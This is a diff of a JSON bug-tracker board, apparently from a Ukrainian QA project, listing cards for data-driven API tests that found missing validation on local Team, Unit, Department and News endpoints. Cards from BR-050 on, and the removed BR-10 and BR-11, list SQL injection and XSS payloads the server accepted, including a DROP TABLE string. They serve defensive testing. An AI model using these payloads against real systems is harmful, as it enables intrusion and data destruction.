+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-025",
+      "name": "BR-025: Team → Update team DDT, ітерація 11: Граничне/Name 5000 символів при оновленні",
+      "desc": "**Опис:** DDT-рядок 11 з `ddt_update_team.csv` — сценарій «Граничне/Name 5000 символів при оновленні».\n\n**Ітерація:** 11 (Team → Update team DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Team/101`\n- Request body: `Name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(5000 символів), Position=Посада`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-3",
+      "pos": 25,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-026",
+      "name": "BR-026: Team → Update team DDT, ітерація 12: Граничне/Emoji в Name та Position при оновленні",
+      "desc": "**Опис:** DDT-рядок 12 з `ddt_update_team.csv` — сценарій «Граничне/Emoji в Name та Position при оновленні».\n\n**Ітерація:** 12 (Team → Update team DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Team/101`\n- Request body: `Name=Член 😀 оновлено, Position=Посада 🎉`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-3",
+      "pos": 26,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-027",
+      "name": "BR-027: Team → Update team DDT, ітерація 16: Граничне/Дуже довгий кириличний Name при оновленні",
+      "desc": "**Опис:** DDT-рядок 16 з `ddt_update_team.csv` — сценарій «Граничне/Дуже довгий кириличний Name при оновленні».\n\n**Ітерація:** 16 (Team → Update team DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Team/101`\n- Request body: `Name=ЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩ...(5000 символів), Position=Посада`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-3",
+      "pos": 27,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-028",
+      "name": "BR-028: Team → Update team DDT, ітерація 18: Граничне/Від'ємний OrderInd приймається при оновленні",
+      "desc": "**Опис:** DDT-рядок 18 з `ddt_update_team.csv` — сценарій «Граничне/Від'ємний OrderInd приймається при оновленні».\n\n**Ітерація:** 18 (Team → Update team DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Team/101`\n- Request body: `Name=OrderInd від'ємний, Position=Посада, OrderInd=-10`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-3",
+      "pos": 28,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-029",
+      "name": "BR-029: Team → Update team DDT, ітерація 20: Граничне/Name лише з пробілів → 400",
+      "desc": "**Опис:** DDT-рядок 20 з `ddt_update_team.csv` — сценарій «Граничне/Name лише з пробілів → 400».\n\n**Ітерація:** 20 (Team → Update team DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Team/101`\n- Request body: `Position=Посада`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-3",
+      "pos": 29,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-030",
+      "name": "BR-030: Unit → Update unit DDT, ітерація 4: Граничне/IsActive не передано — скидається на false, навіть якщо раніше було true",
+      "desc": "**Опис:** DDT-рядок 4 з `ddt_update_unit.csv` — сценарій «Граничне/IsActive не передано — скидається на false, навіть якщо раніше було true».\n\n**Ітерація:** 4 (Unit → Update unit DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Unit/10`\n- Request body: `Name=IsActive не задано при оновленні`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-4",
+      "pos": 30,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-031",
+      "name": "BR-031: Unit → Update unit DDT, ітерація 7: Негатив-очікування/xlsx приймається як заміна Image",
+      "desc": "**Опис:** DDT-рядок 7 з `ddt_update_unit.csv` — сценарій «Негатив-очікування/xlsx приймається як заміна Image».\n\n**Ітерація:** 7 (Unit → Update unit DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Unit/10`\n- Request body: `Name=З документом як зображенням, ImageFilePath=E:/Study/Profkom site/Sprint4/data/Documents/smoke_contacts.xlsx`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-4",
+      "pos": 31,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-032",
+      "name": "BR-032: Unit → Update unit DDT, ітерація 13: Граничне/Оновлення на Name, що дублює інший запис, дозволене",
+      "desc": "**Опис:** DDT-рядок 13 з `ddt_update_unit.csv` — сценарій «Граничне/Оновлення на Name, що дублює інший запис, дозволене».\n\n**Ітерація:** 13 (Unit → Update unit DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Unit/10`\n- Request body: `Name=DupUnitNameUpdated`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-4",
+      "pos": 32,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-033",
+      "name": "BR-033: Unit → Update unit DDT, ітерація 14: Граничне/Дуже довгий кириличний Name при оновленні",
+      "desc": "**Опис:** DDT-рядок 14 з `ddt_update_unit.csv` — сценарій «Граничне/Дуже довгий кириличний Name при оновленні».\n\n**Ітерація:** 14 (Unit → Update unit DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Unit/10`\n- Request body: `Name=ЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩ...(5000 символів)`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-4",
+      "pos": 33,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-034",
+      "name": "BR-034: Unit → Update unit DDT, ітерація 16: Граничне/Від'ємний OrderInd приймається при оновленні",
+      "desc": "**Опис:** DDT-рядок 16 з `ddt_update_unit.csv` — сценарій «Граничне/Від'ємний OrderInd приймається при оновленні».\n\n**Ітерація:** 16 (Unit → Update unit DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Unit/10`\n- Request body: `Name=OrderInd від'ємний, OrderInd=-7`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-4",
+      "pos": 34,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-035",
+      "name": "BR-035: Unit → Update unit DDT, ітерація 18: Граничне/Name лише з пробілів → 400",
+      "desc": "**Опис:** DDT-рядок 18 з `ddt_update_unit.csv` — сценарій «Граничне/Name лише з пробілів → 400».\n\n**Ітерація:** 18 (Unit → Update unit DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Unit/10`\n- Request body: `Content=Name лише з пробілів`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-4",
+      "pos": 35,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-036",
+      "name": "BR-036: Unit → Create unit DDT, ітерація 5: Граничне/OrderInd не передано — приймає значення за замовчуванням 0",
+      "desc": "**Опис:** DDT-рядок 5 з `ddt_create_unit.csv` — сценарій «Граничне/OrderInd не передано — приймає значення за замовчуванням 0».\n\n**Ітерація:** 5 (Unit → Create unit DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `Name=Підрозділ без OrderInd`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-5",
+      "pos": 36,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-037",
+      "name": "BR-037: Unit → Create unit DDT, ітерація 6: Граничне/IsActive не передано — стає FALSE (на відміну від Faculty.IsActive, DTO не має ініціалізатора =true)",
+      "desc": "**Опис:** DDT-рядок 6 з `ddt_create_unit.csv` — сценарій «Граничне/IsActive не передано — стає FALSE (на відміну від Faculty.IsActive, DTO не має ініціалізатора =true)».\n\n**Ітерація:** 6 (Unit → Create unit DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `Name=Підрозділ IsActive не задано`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-5",
+      "pos": 37,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-038",
+      "name": "BR-038: Unit → Create unit DDT, ітерація 12: Негатив-очікування/xlsx приймається як Image — відсутня перевірка MIME",
+      "desc": "**Опис:** DDT-рядок 12 з `ddt_create_unit.csv` — сценарій «Негатив-очікування/xlsx приймається як Image — відсутня перевірка MIME».\n\n**Ітерація:** 12 (Unit → Create unit DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `Name=Документ як зображення, ImageFilePath=E:/Study/Profkom site/Sprint4/data/Documents/smoke_our_structure.xlsx`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-5",
+      "pos": 38,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-039",
+      "name": "BR-039: Unit → Create unit DDT, ітерація 14: Граничне/Від'ємний OrderInd приймається — немає перевірки діапазону",
+      "desc": "**Опис:** DDT-рядок 14 з `ddt_create_unit.csv` — сценарій «Граничне/Від'ємний OrderInd приймається — немає перевірки діапазону».\n\n**Ітерація:** 14 (Unit → Create unit DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `Name=OrderInd від'ємний, OrderInd=-3`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-5",
+      "pos": 39,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-040",
+      "name": "BR-040: Unit → Create unit DDT, ітерація 16: Граничне/Name 5000 символів приймається — немає maxLength",
+      "desc": "**Опис:** DDT-рядок 16 з `ddt_create_unit.csv` — сценарій «Граничне/Name 5000 символів приймається — немає maxLength».\n\n**Ітерація:** 16 (Unit → Create unit DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `Name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(5000 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-5",
+      "pos": 40,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-041",
+      "name": "BR-041: Unit → Create unit DDT, ітерація 20: Граничне/Дублікат Name дозволений — немає обмеження унікальності",
+      "desc": "**Опис:** DDT-рядок 20 з `ddt_create_unit.csv` — сценарій «Граничне/Дублікат Name дозволений — немає обмеження унікальності».\n\n**Ітерація:** 20 (Unit → Create unit DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `Name=DupUnitName`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-5",
+      "pos": 41,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-042",
+      "name": "BR-042: Unit → Create unit DDT, ітерація 21: Граничне/Повторний дублікат того ж Name також дозволений",
+      "desc": "**Опис:** DDT-рядок 21 з `ddt_create_unit.csv` — сценарій «Граничне/Повторний дублікат того ж Name також дозволений».\n\n**Ітерація:** 21 (Unit → Create unit DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `Name=DupUnitName`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-5",
+      "pos": 42,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-043",
+      "name": "BR-043: Unit → Create unit DDT, ітерація 23: Граничне/Дуже довгий кириличний Name (5000 символів) приймається",
+      "desc": "**Опис:** DDT-рядок 23 з `ddt_create_unit.csv` — сценарій «Граничне/Дуже довгий кириличний Name (5000 символів) приймається».\n\n**Ітерація:** 23 (Unit → Create unit DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `Name=ЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩ...(5000 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-5",
+      "pos": 43,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-044",
+      "name": "BR-044: Unit → Create unit DDT, ітерація 24: Граничне/Дуже довгий Content приймається",
+      "desc": "**Опис:** DDT-рядок 24 з `ddt_create_unit.csv` — сценарій «Граничне/Дуже довгий Content приймається».\n\n**Ітерація:** 24 (Unit → Create unit DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `Name=Підрозділ з довгим вмістом, Content=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(5000 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-5",
+      "pos": 44,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-045",
+      "name": "BR-045: Unit → Create unit DDT, ітерація 27: Граничне/Name лише з пробілів → 400",
+      "desc": "**Опис:** DDT-рядок 27 з `ddt_create_unit.csv` — сценарій «Граничне/Name лише з пробілів → 400».\n\n**Ітерація:** 27 (Unit → Create unit DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Unit`\n- Request body: `Content=Name лише з пробілів`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-5",
+      "pos": 45,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-046",
+      "name": "BR-046: Department → Create department DDT, ітерація 72: Finding/Не-зображення (.txt) прийнято як логотип — немає перевірки типу файлу",
+      "desc": "**Опис:** DDT-рядок 72 з `ddt_create_department.csv` — сценарій «Finding/Не-зображення (.txt) прийнято як логотип — немає перевірки типу файлу».\n\n**Ітерація:** 72 (Department → Create department DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `Name=Dept WrongType, Description=Не-зображення як логотип, IsActive=TRUE, logo_path=data/Documents/requirements.txt`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-6",
+      "pos": 46,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-047",
+      "name": "BR-047: Department → Create department DDT, ітерація 75: Finding/Name 300 символів прийнято — немає maxLength",
+      "desc": "**Опис:** DDT-рядок 75 з `ddt_create_department.csv` — сценарій «Finding/Name 300 символів прийнято — немає maxLength».\n\n**Ітерація:** 75 (Department → Create department DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/departments`\n- Request body: `Name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(300 символів), Description=Задовгий Name (300 символів), IsActive=TRUE, logo_path=data/cats/cat.1.jpg`\n- Response: `201`\n\n**Очікуваний результат:** 300 символів\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-6",
+      "pos": 47,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-048",
+      "name": "BR-048: Department → Edit department DDT, ітерація 72: Finding/Не-зображення (.txt) прийнято як логотип — немає перевірки типу файлу",
+      "desc": "**Опис:** DDT-рядок 72 з `ddt_edit_department.csv` — сценарій «Finding/Не-зображення (.txt) прийнято як логотип — немає перевірки типу файлу».\n\n**Ітерація:** 72 (Department → Edit department DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `Name=Dept WrongType, Description=Не-зображення як логотип, IsActive=TRUE, logo_path=data/Documents/requirements.txt`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-7",
+      "pos": 48,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-049",
+      "name": "BR-049: Department → Edit department DDT, ітерація 75: Finding/Name 300 символів прийнято — немає maxLength",
+      "desc": "**Опис:** DDT-рядок 75 з `ddt_edit_department.csv` — сценарій «Finding/Name 300 символів прийнято — немає maxLength».\n\n**Ітерація:** 75 (Department → Edit department DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/departments/11`\n- Request body: `Name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(300 символів), Description=Задовгий Name (300 символів), IsActive=TRUE, logo_path=data/cats/cat.1.jpg`\n- Response: `204`\n\n**Очікуваний результат:** 300 символів\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-7",
+      "pos": 49,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-050",
+      "name": "BR-050: News → SQL_XSS Create news, ітерація 1: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 1 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = ' OR '1'='1`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 50,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
           "color": "red"
         }
       ]
     },
     {
-      "id": "BR-10",
-      "name": "BR-10 [CRITICAL]: Ті самі payload-и приймаються на створенні відділу (Department)",
-      "desc": "**Опис:** `POST /api/departments` має менший набір категорій у тестовому датасеті (SQL Injection, XSS, Length), але й ці приймаються без відмови. Єдиний payload, що коректно відхилено — `Empty` (порожній рядок → `400`).\n\n**Ітерація:** Department → SQL_XSS Create department: 1-4 (SQL Injection), 5-7 (XSS), 9-10 (Length) — 9 з 11 payload-ів провалено\n\n**Тіло:** `POST /api/departments` — `Name=' OR '1'='1` → `201 Created`; `Name=<script>alert(1)</script>` → `201 Created`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (`4xx`) для кожного payload-а, реально отримано `201 Created`.",
-      "idList": "list-security",
-      "pos": 2,
+      "id": "BR-051",
+      "name": "BR-051: News → SQL_XSS Create news, ітерація 2: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 2 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = admin'--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 51,
       "closed": false,
       "due": null,
       "dueComplete": false,
       "labels": [
         {
-          "name": "security-critical",
+          "name": "security",
           "color": "red"
         }
       ]
     },
     {
-      "id": "BR-11",
-      "name": "BR-11 [CRITICAL]: Ті самі payload-и приймаються на редагуванні відділу (Department)",
-      "desc": "**Опис:** `PUT /api/departments/{id}` так само приймає SQL Injection/XSS/Length payload-и в тілі запиту на оновлення.\n\n**Ітерація:** Department → SQL_XSS Edit department: 1-4 (SQL Injection), 5-7 (XSS), 8-10 (Length)\n\n**Тіло:** `PUT /api/departments/11` — `Name=' OR '1'='1` → `204 No Content`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (`4xx`) для кожного payload-а, реально отримано `204 No Content`.",
-      "idList": "list-security",
-      "pos": 3,
+      "id": "BR-052",
+      "name": "BR-052: News → SQL_XSS Create news, ітерація 3: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 3 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = '; DROP TABLE News;--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 52,
       "closed": false,
       "due": null,
       "dueComplete": false,
       "labels": [
         {
-          "name": "security-critical",
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-053",
+      "name": "BR-053: News → SQL_XSS Create news, ітерація 4: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 4 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = ' OR SLEEP(5)--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 53,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-054",
+      "name": "BR-054: News → SQL_XSS Create news, ітерація 5: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 5 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = ' UNION SELECT NULL--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 54,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-055",
+      "name": "BR-055: News → SQL_XSS Create news, ітерація 6: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 6 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = ' OR '1'='1`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 55,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-056",
+      "name": "BR-056: News → SQL_XSS Create news, ітерація 7: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 7 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = '; DROP TABLE News;--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 56,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-057",
+      "name": "BR-057: News → SQL_XSS Create news, ітерація 8: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 8 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = ' OR SLEEP(5)--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 57,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-058",
+      "name": "BR-058: News → SQL_XSS Create news, ітерація 9: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 9 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = <script>alert(1)</script>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 58,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-059",
+      "name": "BR-059: News → SQL_XSS Create news, ітерація 10: [XSS] payload не відхилено",
